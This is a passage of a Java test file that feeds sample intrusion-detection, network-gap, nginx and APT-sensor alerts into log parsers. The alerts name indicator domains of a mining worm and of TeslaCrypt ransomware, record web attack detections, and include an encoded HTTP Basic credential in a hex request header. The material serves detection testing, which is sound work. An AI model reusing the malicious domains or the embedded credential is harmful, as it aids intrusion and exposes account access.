\"服务器被植入后门程序后可能导致以下后果：1.整个网站或者服务器被黑客控制，变成傀儡主机;2.核心数据被窃取，造成用户信息泄露。\", \"dip\": \"172.26.47.224\", \"rule_id\": 10000}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public void testIdsQianxinNDS() {
    String parserFile = "./resources/parsers/ids_qianxin_nds_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<30>skyeye_webattack serial_num=\"eb012245d230f1b80fb845bfbc548ed390728de6\" rule_id=\"4500\" rule_name=\"利用PUT方式上传TXT文件\" dolog_count=\"1\" severity=\"2\" rule_version=\"1\" sip=\"10.95.54.207\" dip=\"10.41.208.17\" sport=\"34902\" dport=\"8081\" method=\"PUT\" host=\"af-biz.qianxin-inc.cn\" uri=\"/artifactory/tianqing/sftp:tq01.sftp.360es.cn/tq_qa/skylar6_backup/automation/pysele/dlp_engine/resource/document/C7-History/src/C7-History008.txt.txt\" agent=\"curl/7.29.0\" req_header=\"505554202f61727469666163746f72792f7469616e71696e672f736674703a747130312e736674702e33363065732e636e2f74715f71612f736b796c6172365f6261636b75702f6175746f6d6174696f6e2f707973656c652f646c705f656e67696e652f7265736f757263652f646f63756d656e742f43372d486973746f72792f7372632f43372d486973746f72793030382e7478742e74787420485454502f312e300d0a582d4a46726f672d4f766572726964652d426173652d55726c3a2068747470733a2f2f61662d62697a2e7169616e78696e2d696e632e636e3a3434330d0a582d466f727761726465642d506f72743a203434330d0a582d466f727761726465642d50726f746f3a2068747470730d0a486f73743a2061662d62697a2e7169616e78696e2d696e632e636e0d0a582d466f727761726465642d466f723a2031302e39352e35342e36370d0a436f6e6e656374696f6e3a20636c6f73650d0a436f6e74656e742d4c656e6774683a20353032320d0a417574686f72697a6174696f6e3a2042617369632063327435624746794c574e704f6b464c513341315a4574464e575246556a5a615a3168524d306730556e706f63484a304e545a36554535744f566c6a6448646b636d5642546c4661626d354f64445a7759544d34516e526f534568756257396957446c5257586c42575574695a316b3d0d0a557365722d4167656e743a206375726c2f372e32392e300d0a4163636570743a202a2f2a0d0a0d0a\" req_body=\"...0 ..e.s.S ..01.-.1.4.0.8......0.S.e.Q.Y.0.y.b.e.b.....0.S.R0W.T.0.N.....0.S.R.g.S.01.9.9.6.0.8.2.5......0.S.Ru..S.0u$.....0.R .{| ..S.0K.9.1......0.R .{| ..T.0-N.V0W.t.....0 .\\O . ... ..0.N.^$......0.YpS.g.S.01.9.9.6.1.0......0 ..h . ... ..0.S.S.N-N.V0W.t.s.X.v.Q!k.z.S.....0 .ck . ..e ..0.... . . . .(W.N{|.S.S.e.g..yr+R/f.g.eW[..}..v...QCSt^eg0W.t.s.X.g.l.g.S.S...g.Y'Y.S.S../f.`7h.S.S.v..../f.N.NnfM.sQ._.v......_N/ff[..../gLu...g.N...N.O.v....KN.N.0.... . . . ..N.l.P.......S.N'k2m.N...X.Y._.v.O.[.Q...Y...v.l.P/fhT.g._.s.v.0dk.T.....N.~.......N.~.R..._.V.vIli`.T.l.V.v?..b.T:N.Nh.......!P.[.l.P.N.S...0.v..,g.N.~....t^.N...b0W.t.s.X.v.S.S.N....:N/f.N.yUS.~.v. ..ba.v.n..\\O(u. .0.u....:N.N.V.N.v;m.R....6q.s.X.....v.S.S/f^.8^._.\\.v.0.... . . . ..N.[.N...g.S.e.N.N{|.u;m.v0W.t.s.X...N.N.gvQ.v.[..ba.S.S.vs^Y..e.g.._N.gvQ.o.p.Ra..v.z.S.e.g.0.... . . . .0W.t.s.X-N..6q~p._.v...S'`.T..-N.z.S'`b_.b.N0W.t.s.X.v.z.S.0.Ykpq\\.U.S.00W..q\\)].0wmxmwm...0'Y..*m4l.0_l.l.l.n.0r^.e..W......0.v.u..P..0'Y..GY.[.0.uirZ....0.S...T'Y..!j..._..GYyr.v)Y.e.sa...*Y3...P[.0Am.f..I{......7h.N.N~p._(W...QCSt^eg.g.e.Q.s.Y........-N....1\\/f.z.S.g...g.e.Q.s.\\...Rce..../f.n.S.g.0.... . . . .9hnc.S.S.e.s..}..T...S.S.S.S0W.t...Y...g...Rek...\\.c.Q.N.N.N.N~p.S.g.0.... . . . .'Y.~...N........t^MR.T.g*m4l~p.S.g.0.... . . . .(W-N.V.0'k2m.T-N...N.v...Y.l.e.Y.].k&O.0.l.e.0pS.^I{...^.l0W.g*m4l~p.S.v..}..T O...0.0.\\fN..'\\xQ.0....vQ.N. dldl.`q\\D.u.......imim.n)Y. .0.0_[P[...n.elQ.0..... .f'\\KN.e..)Y.N.r*gs^..*m4l*jAm...l.n.N)Y.N& & . .0S_.N.v...S.S.c.N.N.......v;T.T.0...N............t^MR.T.....l.N8n.f'Y9eS..0*m4l.S.u.v0W.Wck/f.0.y!..0]N.]-N.vVQ.].0k..].T._.].0...Sf[.[.O.O..Ye.c.xvz....-N.V.S.e.v..q\\.....e.S.T_lYm.N&^.vo..n.e.S.N.^....0R.N.vS_...^.v.e.f.0. ...N........t^KN.e...`.Q._6q'Y.S.0..q\\.e.S.S:N.\\.w.e.S..o..n.e.S_N.z6q.....S:Nl.eh.0Vn.q.e.S.0& & .e.N}.6qMR.T.v.c.0.e.Sb...tS:.ON'}.[.v.b..sQ.|.0& & .\\.w.Nl.eh.0Vn.q...e.SW.@W.R.^.[.^.0E\\@W.vb..y.0....CN...e.S,g...v.N.u.0.u;m4ls^...S.v....NO.N..q\\.0o..n.e.S. .0.N.c.Q. ../f.V:N.u.N.0.u;m.s.X.S.u.N.]'Y.S.S...e.\" rsp_status=\"403\" rsp_content_type=\"application/json;charset=ISO-8859-1\" rsp_header=\"485454502f312e312034303320466f7262696464656e0d0a582d4a46726f672d56657273696f6e3a2041727469666163746f72792f372e31392e31302037313931303930300d0a582d41727469666163746f72792d49643a20633333623037323233336564616363386435326430383038396362653162613163323338336137330d0a582d41727469666163746f72792d4e6f64652d49643a20617274320d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6a736f6e3b636861727365743d49534f2d383835392d310d0a446174653a204672692c2032332053657020323032322031333a34323a303720474d540d0a436f6e6e656374696f6e3a20636c6f73650d0a\" rsp_body=\"7b0a2020226572726f727322203a205b207b0a202020202273746174757322203a203430332c0a20202020226d65737361676522203a20224e6f7420656e6f756768207065726d697373696f6e7320746f2064656c6574652f6f766572777269746520617274696661637420277469616e71696e673a736674703a747130312e736674702e33363065732e636e2f74715f71612f736b796c6172365f6261636b75702f6175746f6d6174696f6e2f707973656c652f646c705f656e67696e652f7265736f757263652f646f63756d656e742f43372d486973746f72792f7372632f43372d486973746f72793030382e7478742e747874272028757365723a2027736b796c61722d636927206e656564732044454c455445207065726d697373696f6e292e220a20207d205d0a7d\" rsp_body_len=\"301\" victim_type=\"server\" attack_flag=\"true\" attacker=\"10.95.54.207\" victim=\"10.41.208.17\" write_date=\"1663940528\" attack_type=\"文件上传\" confidence=\"50\" detail_info=\"发现PUT方式上传TXT文件行为\" solution=\"请联系厂商升级。\" vuln_desc=\"发现PUT方式上传TXT文件行为\" vuln_name=\"利用PUT方式上传TXT文件\" vuln_type=\"文件上传\" webrules_tag=\"1\" code_language=\"其他\" kill_chain=\"0x02020000\" attack_result=\"0\" vendor_id=\"数据传感器-NDS系列\" device_ip=\"10.44.96.148\" sess_id=\"0x632DB7B06093FE10\" attack_type_id=\"33751053\" xff=\"10.95.54.67\" metadata_id=\"0x7E6917152A080C135108695F\" src_mac=\"9C:06:1B:00:76:D1\" dst_mac=\"40:77:A9:E5:B3:CE\" proof param_name=\"req_header\" offset=\"130\" length=\"32\" attck_tactic=\"TA0001\" attck_tech=\"T1190\"";
      parse(botuEngine, data);
      data = "<30>skyeye_webattack serial_num=\"eb012245d230f1b80fb845bfbc548ed390728de6\" rule_id=\"2248\" rule_name=\"访问.PAC代理自动配置文件\" dolog_count=\"1\" severity=\"2\" rule_version=\"1\" sip=\"10.41.231.171\" dip=\"10.95.22.110\" sport=\"59614\" dport=\"34560\" method=\"GET\" host=\"swg-proxy.qianxin-inc.cn:34560\" uri=\"/proxy.pac\" agent=\"WinHttp-Autoproxy-Service/5.1\" req_header=\"474554202f70726f78792e70616320485454502f312e310d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a4163636570743a202a2f2a0d0a49662d4d6f6469666965642d53696e63653a204d6f6e2c2031352041756720323032322031303a31313a313620474d540d0a49662d4e6f6e652d4d617463683a202236326661316263342d326363220d0a557365722d4167656e743a2057696e487474702d4175746f70726f78792d536572766963652f352e310d0a486f73743a207377672d70726f78792e7169616e78696e2d696e632e636e3a33343536300d0a0d0a\" rsp_status=\"304\" rsp_header=\"485454502f312e3120333034204e6f74204d6f6469666965640d0a5365727665723a206e67696e780d0a446174653a204672692c2032332053657020323032322031333a34313a323620474d540d0a4c6173742d4d6f6469666965643a204d6f6e2c2031352041756720323032322031303a31313a313620474d540d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a455461673a202236326661316263342d326363220d0a\" rsp_body_len=\"0\" victim_type=\"server\" attack_flag=\"true\" attacker=\"10.41.231.171\" victim=\"10.95.22.110\" write_date=\"1663940490\" attack_type=\"信息泄露\" confidence=\"50\" detail_info=\"检测到用户试图访问服务器敏感文件，如果服务器没有对用户身份进行验证，攻击者可以通过访问该文件，获取服务器信息，为下一步攻击做准备。\" solution=\"1.加固Web服务器安全配置；2.对web应用程序进行定期更新以防护已知漏洞。 \" vuln_desc=\"检测到用户试图访问服务器敏感文件，如果服务器没有对用户身份进行验证，攻击者可以通过访问该文件，获取服务器信息，为下一步攻击做准备。\" vuln_harm=\"恶意攻击者有可能利用这些从敏感文件中获取到的信息直接获取目标服务器的控制权或实施进一步的攻击。\" vuln_name=\"访问.PAC代理自动配置文件\" vuln_type=\"信息泄露\" webrules_tag=\"1\" public_date=\"2017-04-18\" code_language=\"其他\" site_app=\"http\" kill_chain=\"0x01020000\" attack_result=\"0\" vendor_id=\"数据传感器-NDS系列\" device_ip=\"10.44.96.148\" sess_id=\"0x632DB78A6F111D05\" attack_type_id=\"50528257\" metadata_id=\"0x7E691715291E6D2B8058877D\" src_mac=\"40:77:A9:E5:D2:FA\" dst_mac=\"40:77:A9:E5:B3:CE\" proof param_name=\"req_header\" offset=\"0\" length=\"19\"";
      parse(botuEngine, data);
      data = "<30>skyeye_ids serial_num=\"eb012245d230f1b80fb845bfbc548ed390728de6\" rule_id=\"51444\" rule_name=\"SOCKS代理\" packet_size=\"0\" sip=\"10.41.0.235\" dip=\"10.95.22.110\" sport=\"54115\" dport=\"1080\" appid=\"103\" protocol_id=\"6\" description=\"\" write_date=\"1663940526\" severity=\"2\" vuln_type=\"代理通道\" detail_info=\"SOCKS提供一个框架,为在TCP和UDP域中的客户机/服务器应用程序能更方便安全地使用网络防火墙所提供的服务。\" affected_system=\"Windows\" info_id=\"51444\" victim_type=\"server\" attack_flag=\"true\" attacker=\"10.41.0.235\" victim=\"10.95.22.110\" sig_id=\"51444\" confidence=\"80\" webrules_tag=\"0\" rule_version=\"1\" kill_chain=\"0x02020000\" attack_result=\"1\" attack_type=\"代理通道\" vendor_id=\"数据传感器-NDS系列\" device_ip=\"10.44.96.148\" sess_id=\"0x632DB7A66FADB705\" attack_type_id=\"117506052\" up_payload_size=\"0\" up_payload=\"\" down_payload_size=\"22\" down_payload=\"05080004260310300c04000300000000000000e001bb\" metadata_id=\"0x7E6917152A06E3191058886C\" hit_num=\"1\" duration=\"0\" src_mac=\"40:77:A9:E5:D2:FA\" dst_mac=\"40:77:A9:E5:B3:CE\" proof param_name=\"down_payload\" offset=\"0\" length=\"10\" attck_tactic=\"TA0011\" attck_tech=\"T1090.002\"";
      parse(botuEngine, data);
      data = "<30>skyeye_ids serial_num=\"eb012245d230f1b80fb845bfbc548ed390728de6\" rule_id=\"80011\" rule_name=\"端口扫描\" packet_size=\"0\" sip=\"89.248.165.88\" dip=\"220.181.41.136\" sport=\"48257\" dport=\"1295\" appid=\"0\" protocol_id=\"6\" description=\"\" write_date=\"1663940522\" severity=\"4\" vuln_type=\"端口扫描\" attack_method=\"远程\" detail_info=\"基于网络协议探测存活端口。\" bulletin=\"请及时关闭闲置和有潜在危险的端口。\" affected_system=\"Windows\" info_id=\"80011\" victim_type=\"server\" attack_flag=\"true\" attacker=\"89.248.165.88\" victim=\"220.181.41.136\" sig_id=\"80011\" confidence=\"80\" webrules_tag=\"0\" rule_version=\"1\" kill_chain=\"0x01010000\" attack_result=\"0\" attack_type=\"端口扫描\" vendor_id=\"数据传感器-NDS系列\" device_ip=\"10.44.96.148\" attack_type_id=\"33816577\" up_payload_size=\"0\" up_payload=\"\" down_payload_size=\"0\" down_payload=\"\" metadata_id=\"0x7E6917152A02884A60A89E70\" hit_num=\"1\" duration=\"0\" src_mac=\"4C:E9:E4:9B:48:A8\" dst_mac=\"00:00:0A:40:01:00\" attck_tactic=\"TA0007\" attck_tech=\"T1046\"";
      parse(botuEngine, data);
      data = "<30>skyeye_ioc access_time=\"1663940526951\" tid=\"7\" type=\"网络蠕虫\" rule_desc=\"LifeCalendarWorm挖矿蠕虫活动事件\" offence_type=\"sip\" offence_value=\"10.41.226.104\" sip=\"10.41.226.104\" dip=\"10.95.38.38\" severity=\"7\" serial_num=\"eb012245d230f1b80fb845bfbc548ed390728de6\" rule_state=\"green\" ioc_type=\"host\" ioc_value=\"z.totonm.com\" nid=\"5782621921544039988\" etime=\"2019-11-29 10:26:03\" malicious_type=\"网络蠕虫\" kill_chain=\"general\" confidence=\"high\" malicious_family=\"LifeCalendarWorm\" targeted=\"0\" tag=\"\" platform=\"windows\" current_status=\"unknown\" packet_data=\"QHep5bPOQHep5dL6CABFAAA6XrcAAHwRwuUKKeJoCl8mJucfADUAJi1BqK4BAAABAAAAAAAAAXoGdG90b25tA2NvbQAAAQAB\" ioc_source=\"0\" sport=\"59167\" dport=\"53\" proto=\"DNS\" dns_type=\"1\" desc=\"2018年12月14日下午，监控到一批通过 “人生日历”升级程序下发的木马蠕虫，其具备远程执行代码功能，启动后会将用户计算机的详细信息发往木马服务器，并接收远程指令执行下一步操作。 同时该木马还携带有永恒之蓝漏洞攻击组件，可通过永恒之蓝漏洞攻击局域网与互联网中其它机器。\" host=\"z.totonm.com\" dns_arecord=\"0.0.0.0\" tproto=\"UDP\" victim_ip=\"10.41.226.104\" attack_type=\"网络蠕虫\" vendor_id=\"数据传感器-NDS系列\" device_ip=\"10.44.96.148\" sess_id=\"0x632DB7679D58B80F\" attack_type_id=\"16908289\" metadata_id=\"0x7E6917152837A3C640F8D93A\" attack_result=\"2\" src_mac=\"40:77:A9:E5:D2:FA\" dst_mac=\"40:77:A9:E5:B3:CE\" attck_tactic=\"TA0010\" attck_tech=\"T1041\"";
      parse(botuEngine, data);
      data = "<30>skyeye_ioc access_time=\"1663940519163\" tid=\"7\" type=\"网络蠕虫\" rule_desc=\"LifeCalendarWorm挖矿蠕虫活动事件\" offence_type=\"sip\" offence_value=\"10.41.226.104\" sip=\"10.41.226.104\" dip=\"10.95.38.38\" severity=\"7\" serial_num=\"eb012245d230f1b80fb845bfbc548ed390728de6\" rule_state=\"green\" ioc_type=\"host\" ioc_value=\"each.tenchier.com\" nid=\"5782621921544085209\" etime=\"2020-02-03 13:37:50\" malicious_type=\"网络蠕虫\" kill_chain=\"general\" confidence=\"high\" malicious_family=\"LifeCalendarWorm\" targeted=\"0\" tag=\"\" platform=\"windows\" current_status=\"unknown\" packet_data=\"QHep5bPOQHep5dL6CABFAAA/XrYAAHwRwuEKKeJoCl8mJvIbADUAK6SKV18BAAABAAAAAAAABGVhY2gIdGVuY2hpZXIDY29tAAABAAE=\" ioc_source=\"0\" sport=\"61979\" dport=\"53\" proto=\"DNS\" dns_type=\"1\" desc=\"2018年12月14日下午，监控到一批通过 “人生日历”升级程序下发的木马蠕虫，其具备远程执行代码功能，启动后会将用户计算机的详细信息发往木马服务器，并接收远程指令执行下一步操作。 同时该木马还携带有永恒之蓝漏洞攻击组件，可通过永恒之蓝漏洞攻击局域网与互联网中其它机器。\" host=\"each.tenchier.com\" dns_arecord=\"0.0.0.0\" tproto=\"UDP\" victim_ip=\"10.41.226.104\" attack_type=\"网络蠕虫\" vendor_id=\"数据传感器-NDS系列\" device_ip=\"10.44.96.148\" sess_id=\"0x632DB766C49EC50A\" attack_type_id=\"16908289\" metadata_id=\"0x7E691715283633ADE0A89D8F\" attack_result=\"2\" src_mac=\"40:77:A9:E5:D2:FA\" dst_mac=\"40:77:A9:E5:B3:CE\" attck_tactic=\"TA0010\" attck_tech=\"T1041\"";
      parse(botuEngine, data);
      data = "<30>skyeye_xxxx access_time=\"1595322219\" sip=\"3.3.3.123\" dip=\"3.3.3.134\" sport=\"56089\" dport=\"49708\" attacker=\"3.3.3.123\" victim=\"3.3.3.134\" app_id=\"4\" app_name=\"FTP\" protol7_id=\"2\" protol7_name=\"ftp\" direction=\"0\" rule_id=\"19825\" rule_name=\"Virus/DOS.DirVirus\" malicious_type=\" 电 脑 病 毒 \" malicious_type_id=\"16842753\" malicious_family=\"DirVirus\" affected_platform=\"DOS\" confidence=\"2\" kill_chain=\"Delivery\" attack_result=\"3\" file_dir=\"/文件统计\" filename=\"DIR691.COM\" mime_type=\"application/x-msdownload\" file_md5=\"79C4FA46E17913B5A4C7173F120C3CC7\" file_sha256=\"\" detect_method=\"1\" behaviour_label=\"\" vendor_id=\"NDS_2\" sess_id=\"0x5F16AF6B001EEE05\" serial_num=\"105e629d699fc6ead78e905b54f949211d545d21\" metadata_id=\"0x7E4715110327A58DC0500192\" src_mac=\"00:50:56:92:10:5C\" dst_mac=\"00:11:11:22:22:14\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //安盟信息网闸
  public void testGapAnmitGap20200412() {
    String parserFile = "./resources/parsers/gap_anmit_gap[20200412]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<13>Nov 10 20:11:42 TopRules sys6_w[25153]: <5>ID=\"TopIGap\" FW=\"TopRules\" TIME=\"2020-11-10 20:11:42\" PRI=\"5\" DEVID=\"TIG1326D53\" MODULE=\"访问日志\" USER=\"\" SRC=\"192.168.1.3\" DST=\"192.168.1.2\" SPT=\"52158\" DPT=\"80\" SMAC=\"11:11:11:11:11:11\" DMAC=\"22:22:22:22:22:22\" PROTO=\"NULL_TCP\" MSG=\" \" DESC=\"SYN\" RESULT=\"成功\" ISOUT=\"1\"";
      parse(botuEngine, data);
      data = "<11>Nov 10 20:25:05 TopRules sys6[27698]: <3>ID=\"TopIGap\" FW=\"TopRules\" TIME=\"2020-11-10 20:25:05\" PRI=\"3\" DEVID=\"TIG1326D53\" MODULE=\"攻击防护日志\" SRC=\"192.168.1.2\" DST=\"192.168.1.3\" SPT=\"56262\" DPT=\"80\" SMAC=\"11:11:11:11:11:11\" DMAC=\"22:22:22:22:22:22\" MSG=\"访问阻断\" DESC=\"SYNDDOS\" ACTION=\"拒绝\" ISOUT=\"0\"";
      parse(botuEngine, data);
      data = "<13>Nov 11 12:51:09 TopRules root: <5>ID=\"TopIGap\" FW=\"TopRules\" TIME=\"2020-11-11 12:51:09\" PRI=\"5\" DEVID=\"TIG1326D53\" MODULE=\"管理日志\" SRC=\"10.63.37.29\" USER=\"superman\" MSG=\"修改数据库同步策略[数据库同步dr建立] \" DESC=\"\" RESULT=\"成功\"";
      parse(botuEngine, data);
      data = "<11>Nov 10 20:32:56 TopRules sys6[31548]: <3>ID=\"TopIGap\" FW=\"TopRules\" TIME=\"2020-11-10 20:32:56\" PRI=\"3\" DEVID=\"TIG1326D53\" MODULE=\"内容过滤日志\" USER=\"user1\" SRC=\"1.1.1.1\" DST=\"2.2.2.2\" SPT=\"5555\" DPT=\"80\" PROTO=\"HTTP\" MSG=\"文件a.txt存在禁止的关键字【秘密】\" DESC=\"禁止通过的关键字\" ACTION=\"拒绝\" ISOUT=\"0\"";
      parse(botuEngine, data);
      data = "<13>Sep 11 14:48:51 SUGAP root: <5>ID=\"SU-GAP3000\" FW=\"SUGAP\" TIME=\"2020-09-11 14:48:51\" PRI=\"5\" DEVID=\"GAP-13290DD\" MODULE=\"审计管理日志\" SRC=\"192.168.55.139\" USER=\"loguser\" MSG=\"登录成功\" DESC=\"\" RESULT=\"成功\"";
      parse(botuEngine, data);
      data = "<13>Nov 11 14:14:51 TopRules root: <5>ID=\"TopIGap\" FW=\"TopRules\" TIME=\"2020-11-11 14:14:51\" PRI=\"5\" DEVID=\"TIG1326D53\" MODULE=\"数据库同步日志\" SRC=\"10.7.200.249\" SRCDB=\"[MySQL] testism\" SRCTBL=\"-\" DST=\"10.7.217.12\" DSTDB=\"[MySQL] testism\" DSTTBL=\"-\" MSG=\"初始化成功\" DESC=\"\" RESULT=\"完成\"";
      parse(botuEngine, data);
      data = "<11>Sep 11 14:53:59 SUGAP msync[22440]: <3>ID=\"SU-GAP3000\" FW=\"SUGAP\" TIME=\"2020-09-11 14:53:59\" PRI=\"3\" DEVID=\"GAP-13290DD\" MODULE=\"文件交换日志\" SRC=\"192.168.55.1\" DST=\"\" TASKNAME=\"uuuu\" SPATH=\"\" DPATH=\"\" FILENAME=\"\" MSG=\"网络异常\" DESC=\"\" RESULT=\"失败\" ISOUT=\"0\"";
      parse(botuEngine, data);
      data = "<13>Sep 11 14:51:56 SUGAP sys6[21867]: <5>ID=\"SU-GAP3000\" FW=\"SUGAP\" TIME=\"2020-09-11 14:51:56\" PRI=\"5\" DEVID=\"GAP-13290DD\" MODULE=\"系统日志\" MSG=\"工作状态\" DESC=\"设备开始正常工作\" RESULT=\"成功\" ISOUT=\"0\"";
      parse(botuEngine, data);
      data = "<13>Nov 11 14:15:10 TopRules recvmain_w[1352]: <5>ID=\"TopIGap\" FW=\"TopRules\" TIME=\"2021-01-04 10:15:10\" PRI=\"5\" DEVID=\"TIG1326D53\" MODULE=\"系统状态日志\" CPU=\"3.561828%\" MEM=\"16.027164%\" DISK=\"52.762001%\" LINKNUM=\"0\" NET=\"1\" NETFLOW=\"296\" DEVSTATUS=\"0\" DESC=\"\" ISOUT=\"1\"";
      parse(botuEngine, data);
      data = "<13>Nov 10 20:11:43 TopRules recvmain[1350]: <5>ID=\"TopIGap\" FW=\"TopRules\" TIME=\"2021-01-04 10:11:43\" PRI=\"5\" DEVID=\"TIG1326D53\" MODULE=\"系统状态日志\" CPU=\"7.611549%\" MEM=\"17.478882%\" DISK=\"57.821377%\" LINKNUM=\"0\" NET=\"1\" NETFLOW=\"795592\" DEVSTATUS=\"0\" DESC=\"\" ISOUT=\"0\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //nginx
  public void testApplicationNginx() {
    String parserFile = "./resources/parsers/webserver_nginx_nginx_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<134>Sep 13 15:19:07 localhost 111_nginx_access 192.168.40.5 - - [13/Sep/2021:15:19:01 +0800] \"GET / HTTP/1.1\" 400 255 \"-\" \"curl/7.64.0\" \"-\"";
      parse(botuEngine, data);
      data = "<invld>Sep 15 15:14:02 localhost 111_nginx_error 2021/09/15 15:14:01 [warn] 13576#0: *827821 an upstream response is buffered to a temporary file /usr/local/nginx/proxy_temp/9/65/0000007659 while reading upstream, client: 192.168.40.35, server: www.nvdb.org.cn, request: \"GET /user/css/chunk-vendors.7a1a9ba1.css HTTP/1.1\", upstream: \"http://192.168.40.111:8894/css/chunk-vendors.7a1a9ba1.css\", host: \"www.nvdb.org.cn\", referrer: \"https://www.nvdb.org.cn/user/login\"";
      parse(botuEngine, data);

    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //远江盛邦持续威胁检测与溯源系统
  public void testAptWebrayTopapt() {
    String parserFile = "./resources/parsers/apt_webray_topapt[rayeye_1.8.21]_json.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "2021-06-11T01: 57: 00.737Z172.16.1.247notice{\"kill_chain\": \"remote-control\",\"dst_ip_geoloc\": \"37.751,-97.822\",\"victim_geoloc\": \"39.9047,116.4072\",\"hostip\": \"172.16.1.101\",\"dst_ip_country_code\": \"US\",\"event_source\": \"NDE\",\"rid\": \"2024106\",\"uuid\": \"5b699127-3f74-4205-a991-273f74620558\",\"number\": 1,\"hostname\": \"ATD\",\"enrichments.src_ip.host_type\": \"2\",\"payload\": \"VS4uLi4uLi4uLi4uLjd0bm80aGliNDd2bGVwNW8uNjNnaGR5ZTE3LmNvbS4uLi4u\",\"commid\": \"1:WuRVj3OPTVWtZxLc7y48hQ5VyZU=\",\"enrichments.victim.in_range\": 1,\"victim_city\": \"北京市\",\"dns\": {\"qtype_name\": \"A\",\"origin_answers\": \"104.28.11.192\",\"query\": \"7tno4hib47vlep5o.63ghdye17.com\",\"answers\": \"104.28.11.192\",\"ttl\": \"299\"},\"dst_ip_country\": \"United States\",\"victim_country_code\": \"CN\",\"enrichments.src_ip.host_group\": \"Default Terminal Group\",\"proto\": \"udp\",\"enrichments.src_ip.malicious\": \"2\",\"victim_port\": \"51618\",\"desc\": \"query:7tno4hib47vlep5o.63ghdye17.com;answers:104.28.11.192;qtype_name:A;\",\"sub_category\": \"\",\"src_ip_city\": \"北京市\",\"visit_direction_detail\": \"12\",\"reliability\": 9,\"classtype\": \"trojan-activity\",\"increment\": 0,\"interface\": \"pcap;9fb5aa78-14b7-45ed-b5aa-7814b775ed93.pcap\",\"dst_ip\": \"8.8.4.5\",\"enrichments.dst_ip.malicious\": \"2\",\"src_ip\": \"192.168.126.128\",\"dst_ip_city\": \"\",\"pcap_record\": \"/2021-06-11/09/56/31/1087489862074296.pcap\",\"victim\": \"192.168.126.128\",\"sensor_ip\": \"172.16.1.101\",\"visit_direction\": \"1\",\"timestamp\": \"1623376592097\",\"direction\": \"up\",\"severity\": 4,\"enrichments.src_ip.in_range\": 1,\"victim_country\": \"China\",\"message\": \"TROJAN Win32/Teslacrypt Ransomware .onion domain (7tno4hib47vlep5o)\",\"app_proto\": \"dns\",\"target\": \"TROJAN Win32/Teslacrypt Ransomware .onion domain (7tno4hib47vlep5o)\",\"src_port\": \"51618\",\"engine_type\": \"sde\",\"src_ip_country_code\": \"CN\",\"dst_port\": \"53\",\"src_ip_geoloc\": \"39.9047,116.4072\",\"src_ip_country\": \"China\",\"category\": \"ransomware\",\"resp_data\": \"\",\"family\": \"\",\"ts\": \"1622865644.786\",\"sensor_name\": \"ATD\"}";
      parse(botuEngine, data);
      data = "2021-06-11T03: 24: 00.446Z172.16.1.247notice{\"attacker_city\": \"北京市\",\"kill_chain\": \"remote-control\",\"enrichments.attacker.in_range\": 1,\"dst_ip_geoloc\": \"39.9047,116.4072\",\"victim_geoloc\": \"39.9047,116.4072\",\"hostip\": \"172.16.1.101\",\"dst_ip_country_code\": \"CN\",\"event_source\": \"NDE\",\"rid\": \"3002002\",\"uuid\": \"06ae7321-c994-4dfd-ae73-21c9941dfdf7\",\"number\": 1,\"hostname\": \"ATD\",\"enrichments.src_ip.host_type\": \"2\",\"payload\": \"SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBNb24sIDE2IE9jdCAyMDE3IDA5OjE0OjIyIEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjQgKFdpbjMyKSBQSFAvNS4yLjQNClgtUG93ZXJlZC1CeTogUEhQLzUuMi40DQpDb250ZW50LUxlbmd0aDogMjk5DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWwNCg0KLT58Li8uMjAxNy0xMC0xNiAwOToxNDoyMi4wLjA3NzcKamlhb2RhLy4yMDE0LTAxLTE2IDE2OjA1OjQyLjAuMDc3NwouLi4xOTcwLTAxLTAxIDAwOjAwOjAwLi4KMS5waHAuMjAxNy0xMC0xNiAwOTowNzo1Mi4yNy4wNjY2CmNvb2sudHh0LjIwMTctMTAtMTYgMDg6NTk6MzIuMzAyLjA2NjYKY29va2llcy5waHAuMjAxNy0xMC0xNiAwODo1MTo0OS4zMDEuMDY2NgpwaHBpbmZvLnBocC4yMDA4LTA5LTAzIDA3OjM0OjA2LjI3OC4wNjY2ClJlbW92ZUZyb21TaGVsbC5yZWcuMjAxNy0xMC0xNiAwOToxNDoyMi4xMTIuMDY2Ngp8PC0=\",\"commid\": \"1:fo4Q/TYU9keUXf6ki0z+veeYZRY=\",\"enrichments.dst_ip.in_range\": 1,\"enrichments.victim.in_range\": 1,\"victim_city\": \"北京市\",\"enrichments.dst_ip.host_type\": \"2\",\"attacker_country_code\": \"CN\",\"dst_ip_country\": \"China\",\"victim_country_code\": \"CN\",\"enrichments.src_ip.host_group\": \"Default Terminal Group\",\"proto\": \"tcp\",\"enrichments.src_ip.malicious\": \"2\",\"http\": {\"status_code\": 200,\"method\": \"POST\",\"server_header_names\": \"Date: Mon, 16 Oct 2017 09:14:22 GMT\\\\nServer: Apache/2.2.4 (Win32) PHP/5.2.4\\r\\nX-Powered-By: PHP/5.2.4\\r\\nContent-Length: 299\\r\\nConnection: 